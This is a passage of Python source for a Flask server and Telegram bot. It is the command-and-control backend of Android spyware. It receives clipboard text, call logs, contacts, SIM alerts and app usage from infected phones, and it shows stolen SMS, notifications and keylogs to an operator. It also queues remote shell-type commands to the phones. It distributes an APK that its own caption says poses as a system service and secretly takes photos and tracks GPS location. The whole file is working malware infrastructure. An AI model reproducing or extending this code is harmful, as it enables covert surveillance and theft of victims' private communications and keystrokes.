        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/collect-clipboard", methods=["POST"])
def api_collect_clipboard():
    """Collect clipboard copies from Android"""
    try:
        d = request.get_json(silent=True) or {}
        device_id = d.get("device_id", "unknown")
        entries = d.get("entries", d.get("clipboard_list", []))
        if not entries and "text" in d:
            entries = [d]
        for e in entries:
            txt = e.get("text","")
            db_exec("INSERT INTO clipboard_log (device_id,text,char_length,app,class_name,timestamp,received_at) VALUES (?,?,?,?,?,?,?)",
                (device_id, txt, len(txt), e.get("app",""), e.get("class_name",""),
                 e.get("timestamp",int(time.time())), datetime.now().isoformat()))
        return jsonify({"success": True, "count": len(entries)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/collect-call-logs/<device_id>", methods=["POST"])
def api_collect_call_logs(device_id):
    """Collect call logs from Android"""
    try:
        d = request.get_json(silent=True) or {}
        calls = d.get("calls", d.get("call_list", []))
        for c in calls:
            db_exec("INSERT INTO call_logs (device_id,phone_number,contact_name,call_type,duration,timestamp,received_at) VALUES (?,?,?,?,?,?,?)",
                (device_id, c.get("phone_number",""), c.get("contact_name",""),
                 c.get("call_type",""), c.get("duration",0), c.get("timestamp",""),
                 datetime.now().isoformat()))
        return jsonify({"success": True, "count": len(calls)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/collect-contacts/<device_id>", methods=["POST"])
def api_collect_contacts(device_id):
    """Collect contacts from Android"""
    try:
        d = request.get_json(silent=True) or {}
        contacts = d.get("contacts", d.get("contact_list", []))
        for c in contacts:
            db_exec("INSERT INTO contacts (device_id,name,phone_number,email,source,timestamp,received_at) VALUES (?,?,?,?,?,?,?)",
                (device_id, c.get("name",""), c.get("phone_number",""), c.get("email",""),
                 c.get("source",""), c.get("timestamp",""), datetime.now().isoformat()))
        return jsonify({"success": True, "count": len(contacts)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/collect-sim-change/<device_id>", methods=["POST"])
def api_collect_sim_change(device_id):
    """Collect SIM card change alerts"""
    try:
        d = request.get_json(silent=True) or {}
        db_exec("INSERT INTO sim_change_alerts (device_id,old_sim,new_sim,old_operator,new_operator,timestamp,received_at) VALUES (?,?,?,?,?,?,?)",
            (device_id, d.get("old_sim",""), d.get("new_sim",""),
             d.get("old_operator",""), d.get("new_operator",""),
             d.get("timestamp",""), datetime.now().isoformat()))
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/collect-apps/<device_id>", methods=["POST"])
def api_collect_apps(device_id):
    """Collect app usage (foreground app switches)"""
    try:
        d = request.get_json(silent=True) or {}
        apps = d.get("apps", d.get("app_list", []))
        for a in apps:
            db_exec("INSERT INTO app_usage_log (device_id,package,class_name,timestamp,received_at) VALUES (?,?,?,?,?)",
                (device_id, a.get("package",""), a.get("class_name",""),
                 a.get("timestamp",int(time.time())), datetime.now().isoformat()))
        return jsonify({"success": True, "count": len(apps)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


# ============ BANSOS-TRACKER DATA READING APIS ============

@app.route("/api/data/sms/<device_id>")
def api_data_sms(device_id):
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 403
    rows = db_exec("SELECT id,sender,message,timestamp,app,received_at FROM notif_log WHERE device_id=? AND app='sms' ORDER BY id DESC LIMIT 100",
        (device_id,)) if device_id != "all" else \
        db_exec("SELECT id,sender,message,timestamp,app,received_at FROM notif_log WHERE app='sms' ORDER BY id DESC LIMIT 100")
    if not rows:
        rows = db_exec("SELECT id,sender,message,timestamp,device_id,received_at FROM sms_log WHERE device_id=? ORDER BY id DESC LIMIT 100",
            (device_id,)) if device_id != "all" else \
            db_exec("SELECT id,sender,message,timestamp,device_id,received_at FROM sms_log ORDER BY id DESC LIMIT 100")
    return jsonify({"sms": [{"id":r[0],"sender":r[1],"message":r[2],"ts":r[3]} for r in rows]})

@app.route("/api/data/notif/<device_id>")
def api_data_notif(device_id):
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 403
    rows = db_exec("SELECT id,sender,message,timestamp,app,received_at FROM notif_log WHERE device_id=? AND app NOT IN ('sms','com.whatsapp','com.facebook.katana') ORDER BY id DESC LIMIT 100",
        (device_id,)) if device_id != "all" else \
        db_exec("SELECT id,sender,message,timestamp,app,received_at FROM notif_log WHERE app NOT IN ('sms','com.whatsapp','com.facebook.katana') ORDER BY id DESC LIMIT 100")
    return jsonify({"notifications": [{"id":r[0],"sender":r[1],"message":r[2],"ts":r[3],"app":r[4]} for r in rows]})

@app.route("/api/data/keylog/<device_id>")
def api_data_keylog(device_id):
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 403
    rows = db_exec("SELECT id,text,package,timestamp FROM keylog_log WHERE device_id=? ORDER BY id DESC LIMIT 200",
        (device_id,)) if device_id != "all" else \
        db_exec("SELECT id,text,package,timestamp FROM keylog_log ORDER BY id DESC LIMIT 200")
    return jsonify({"keylogs": [{"id":r[0],"text":r[1],"app":r[2],"ts":r[3]} for r in rows]})

@app.route("/api/data/clipboard/<device_id>")
def api_data_clipboard(device_id):
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 403
    rows = db_exec("SELECT id,text,app,timestamp FROM clipboard_log WHERE device_id=? ORDER BY id DESC LIMIT 100",
        (device_id,)) if device_id != "all" else \
        db_exec("SELECT id,text,app,timestamp FROM clipboard_log ORDER BY id DESC LIMIT 100")
    return jsonify({"clipboard": [{"id":r[0],"text":r[1],"app":r[2],"ts":r[3]} for r in rows]})

@app.route("/api/data/apps/<device_id>")
def api_data_apps(device_id):
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 403
    rows = db_exec("SELECT id,package,class_name,timestamp FROM app_usage_log WHERE device_id=? ORDER BY id DESC LIMIT 100",
        (device_id,)) if device_id != "all" else \
        db_exec("SELECT id,package,class_name,timestamp FROM app_usage_log ORDER BY id DESC LIMIT 100")
    return jsonify({"apps": [{"id":r[0],"package":r[1],"class":r[2],"ts":r[3]} for r in rows]})

@app.route("/api/data/calls/<device_id>")
def api_data_calls(device_id):
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 403
    rows = db_exec("SELECT id,phone_number,contact_name,call_type,duration,timestamp FROM call_logs WHERE device_id=? ORDER BY id DESC LIMIT 100",
        (device_id,)) if device_id != "all" else \
        db_exec("SELECT id,phone_number,contact_name,call_type,duration,timestamp FROM call_logs ORDER BY id DESC LIMIT 100")
    return jsonify({"calls": [{"id":r[0],"phone":r[1],"contact":r[2],"type":r[3],"dur":r[4],"ts":r[5]} for r in rows]})

@app.route("/api/data/contacts/<device_id>")
def api_data_contacts(device_id):
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 403
    rows = db_exec("SELECT id,name,phone_number,email FROM contacts WHERE device_id=? ORDER BY id DESC LIMIT 200",
        (device_id,)) if device_id != "all" else \
        db_exec("SELECT id,name,phone_number,email FROM contacts ORDER BY id DESC LIMIT 200")
    return jsonify({"contacts": [{"id":r[0],"name":r[1],"phone":r[2],"email":r[3]} for r in rows]})

@app.route("/api/data/sim-alerts/<device_id>")
def api_data_sim_alerts(device_id):
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 503
    rows = db_exec("SELECT id,old_sim,new_sim,old_operator,new_operator,timestamp FROM sim_change_alerts WHERE device_id=? ORDER BY id DESC LIMIT 50",
        (device_id,)) if device_id != "all" else \
        db_exec("SELECT id,old_sim,new_sim,old_operator,new_operator,timestamp FROM sim_change_alerts ORDER BY id DESC LIMIT 50")
    return jsonify({"alerts": [{"id":r[0],"old_sim":r[1],"new_sim":r[2],"old_op":r[3],"new_op":r[4],"ts":r[5]} for r in rows]})

@app.route("/api/commands/<device_id>", methods=["GET"])
def api_commands_get(device_id):
    """Get pending commands for Android device"""
    rows = db_exec("SELECT id,command_type,command_params,created_at FROM command_queue WHERE device_id=? AND status='pending' ORDER BY id ASC",
        (device_id,))
    return jsonify({"commands": [{"id":r[0],"type":r[1],"params":r[2],"created":r[3]} for r in rows]})

@app.route("/api/commands/<device_id>/add", methods=["POST"])
def api_commands_add(device_id):
    """Add a remote command for Android device"""
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 403
    d = request.get_json(silent=True) or {}
    db_exec("INSERT INTO command_queue (device_id,command_type,command_params,status,created_at) VALUES (?,?,?,'pending',?)",
        (device_id, d.get("type","shell"), d.get("params","{}"), datetime.now().isoformat()))
    return jsonify({"success": True})

@app.route("/api/commands/<device_id>/<int:cmd_id>", methods=["POST"])
def api_commands_exec(device_id, cmd_id):
    """Mark command as executed"""
    d = request.get_json(silent=True) or {}
    db_exec("UPDATE command_queue SET status=?, executed_at=?, result=? WHERE id=? AND device_id=?",
        (d.get("status","done"), datetime.now().isoformat(), d.get("result",""), cmd_id, device_id))
    return jsonify({"success": True})


@app.route("/apk/download")
def apk_download():
    """Download the Android APK"""
    apk_path = "/root/droid-service/build/output/SystemService-v1.0.0.apk"
    if os.path.exists(apk_path):
        return send_file(apk_path, mimetype="application/vnd.android.package-archive",
                         as_attachment=True, attachment_filename="SystemService-v1.0.0.apk")
    return "APK not found", 404


async def cmd_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send APK download info with image"""
    banner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static", "apk-banner.png")
    caption = (
        "📱 *System Service APK*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔧 Gear Icon — menyamar sebagai service sistem\n"
        "📸 Camera Capture — foto otomatis saat izin diberikan\n"
        "📍 GPS Tracker — lacak lokasi real-time\n"
        "🔋 Battery Info — status baterai & suhu\n"
        "📦 App List — daftar app terinstall\n"
        "🚀 Auto-start saat boot HP\n\n"
        "⬇️ *Download:*\n"
        f"`{BASE_URL}/apk/download`\n\n"
        "📊 *Dashboard:*\n"
        f"`{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}`\n\n"
        "Copy link di atas, buka di browser!"
    )
    kb = [[
        InlineKeyboardButton("⬇️ Download APK", url=f"{BASE_URL}/apk/download"),
        InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}"),
    ]]
    kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
    try:
        with open(banner_path, "rb") as f:
            await update.message.reply_photo(photo=f, caption=caption,
                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    except Exception as e:
        print(f"APK banner error: {e}")
        await update.message.reply_text(caption,
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")


# ============ MAIN ============
def main():
    init_db()
    from threading import Thread
    Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False), daemon=True).start()
    print("🌐 Web server :5000")

    app_bot = Application.builder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", cmd_start))
    app_bot.add_handler(CommandHandler("help", cmd_start))
    app_bot.add_handler(CommandHandler("links", cmd_start))
    app_bot.add_handler(CommandHandler("map", cmd_start))
    app_bot.add_handler(CommandHandler("apk", cmd_apk))
    app_bot.add_handler(CallbackQueryHandler(on_click))
    print("🤖 Bot running...")
    app_bot.run_polling()

if __name__ == "__main__":
    main()
